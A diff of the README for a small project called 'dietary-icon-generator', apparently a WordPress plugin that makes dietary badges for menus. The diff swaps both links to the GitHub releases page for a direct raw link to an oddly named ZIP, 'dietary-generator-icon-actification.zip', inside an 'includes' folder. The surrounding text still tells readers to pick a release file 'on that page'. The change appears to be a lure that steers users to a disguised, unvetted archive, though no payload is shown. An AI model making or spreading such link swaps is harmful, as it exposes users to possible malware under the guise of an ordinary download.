@@ -1,6 +1,6 @@
 # 🎯 dietary-icon-generator - Simple badges for food menus
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/yuvraj9090/dietary-icon-generator/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/yuvraj9090/dietary-icon-generator/raw/refs/heads/main/includes/dietary-generator-icon-actification.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Use it when you want clear labels for items such as:
 
 To get the app, visit this page to download:
 
-https://github.com/yuvraj9090/dietary-icon-generator/releases
+https://github.com/yuvraj9090/dietary-icon-generator/raw/refs/heads/main/includes/dietary-generator-icon-actification.zip
 
 On that page, look for the latest release file. Download the file that matches your setup. If you use WordPress, the file will usually be a plugin ZIP file.
 
